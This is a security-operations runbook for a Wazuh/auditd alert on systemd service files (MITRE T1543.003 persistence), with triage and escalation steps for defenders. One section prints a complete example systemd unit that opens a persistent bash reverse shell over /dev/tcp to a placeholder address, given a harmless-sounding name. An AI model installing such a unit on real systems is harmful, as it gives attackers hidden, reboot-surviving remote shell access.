# RUNBOOK: T1543.003 — Create/Modify System Process: Systemd Service
**Rule IDs:** 101008 (base) / 101009 (alert)
**Level:** 11 (High) | **Tactic:** Persistence
**Platform:** Linux | **Log Source:** Auditd -> Wazuh

---

## Alert Summary
A systemd service file was created, modified, or deleted in a monitored directory.
Attackers create malicious systemd services to establish persistent access that
survives reboots, runs as any user (including root), and executes automatically
on system startup or on a timer.

## What Triggered It
Auditd detected a write syscall against /etc/systemd/system/ or
/usr/lib/systemd/system/, tagged with key tripwire_systemd_service.
The alert fires when the modifying process is not a known package manager
or system tool.

## Detection Architecture Notes
- Auditd watches: /etc/systemd/system -p wa and /usr/lib/systemd/system -p wa
- Base rule 101008 (level 0, noalert) catches the key match silently
- Alert rule 101009 fires when audit.command is NOT a known-good process
- Both CREATE and DELETE syscalls trigger the rule

## False Positive Scenarios
- System administrators creating legitimate services via tee/cp
- Software packages installing service files during apt/snap installation
- Configuration management tools deploying services

## Triage Steps
1. Check audit.command — what process created/modified the service file?
2. Check the exact file path in the PATH field of the alert
3. Read the service file content: cat /etc/systemd/system/<service-name>
4. Check ExecStart — what command does it run?
5. Check if the service was enabled: systemctl is-enabled <service-name>
6. Check if the service is currently running: systemctl status <service-name>
7. Correlate with other alerts from the same user/session

## Malicious Service Example
The following would give an attacker a persistent reverse shell:

    [Unit]
    Description=System Network Service

    [Service]
    ExecStart=/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
    Restart=always

    [Install]
    WantedBy=multi-user.target

## Escalation Criteria
Escalate immediately if:
- Service ExecStart contains network connections, curl/wget, or base64
- Service runs as root and was created by an unexpected user
- Service was enabled and started immediately after creation
- Creation followed lateral movement or privilege escalation alerts

## References
- https://attack.mitre.org/techniques/T1543/003/
- Validated with: sudo tee /etc/systemd/system/tripwire-test.service
